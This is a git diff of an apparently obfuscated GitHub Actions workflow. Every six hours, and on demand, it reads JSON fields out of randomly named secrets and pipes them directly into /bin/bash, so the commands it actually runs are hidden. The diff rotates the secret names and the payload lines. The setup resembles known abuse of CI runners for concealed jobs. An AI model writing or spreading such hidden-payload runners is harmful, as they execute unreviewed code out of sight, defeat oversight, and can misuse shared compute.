@@ -1,8 +1,9 @@
 name: wendixiang9772
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 5/6 * * *'
+    - cron: '13 2/6 * * *'
 
 jobs:
   build:
@@ -11,15 +12,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: wendixiang9772
         env:
-          gvlep0577: ${{ secrets.gvlep0577 }}
+          kyto7000: ${{ secrets.kyto7000 }}
         run: |
-          echo $gvlep0577 | jq -r .zaf5 | /bin/bash
-          echo $qy917 | jq -r .f846 | /bin/bash
-          echo $xeugv61003 | jq -r .pooe2879 | /bin/bash
-          echo $ygqbj5 | jq -r .huvr95 | /bin/bash
-          echo $le171 | jq -r .lr80483 | /bin/bash
-          echo $vjjj55 | jq -r .ggc59841 | /bin/bash
-          echo $vug03 | jq -r .z81520 | /bin/bash
-          echo $k80029 | jq -r .fy55687 | /bin/bash
-          echo $odl285 | jq -r .bvdhz97 | /bin/bash
+          echo $kyto7000 | jq -r .wwbla95 | /bin/bash
+          echo $j058 | jq -r .alm4370 | /bin/bash
 
